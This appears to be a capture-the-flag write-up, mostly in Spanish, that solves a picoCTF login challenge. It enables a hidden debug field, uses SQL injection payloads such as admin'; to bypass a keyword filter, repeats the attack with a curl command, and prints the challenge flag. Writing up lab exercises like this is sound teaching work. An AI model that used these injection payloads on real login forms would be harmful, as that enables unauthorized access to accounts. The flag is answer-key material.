## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751
## Solución 1
 - Similar como al primero entramos a la pagina y nos dirigimos al login de la pagina.
- Inspeccionamos la pagina.
- Descubrimos que había un campo invisible para el usuario, así que modificamos el tipo para que sea visible y cambiamos su valor por 1.
```bash
<input type="hidden" name="debug" value="0">
<input name="debug" value="1">
```
- Cuando intentamos ingresar nos muestra tanto los datos de nuestro registro como la sentencia SQL que utiliza.
```bash
username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
```
- Al saber que tipo de sentencia utiliza nos regresamos al formulario e intentamos hacer lo mismo que en el primero, pero al parecer filtra lo que le enviamos y entonces como sabemos que hay un usuario llamado admin modificamos el registro para que nos logre ingresar y así nos muestra la bandera.
```bash
username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'

# SQLi detected.

username: admin';
password: admin
SQL query: SELECT * FROM users WHERE name='admin';' AND password='admin'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}
```
## Solución 2
```bash
armandoPC-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin';&password=admin&dwbug=1"
<h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>armandoPC-picoctf@webshell:~$
```
## Notas Adicionales
## Referencias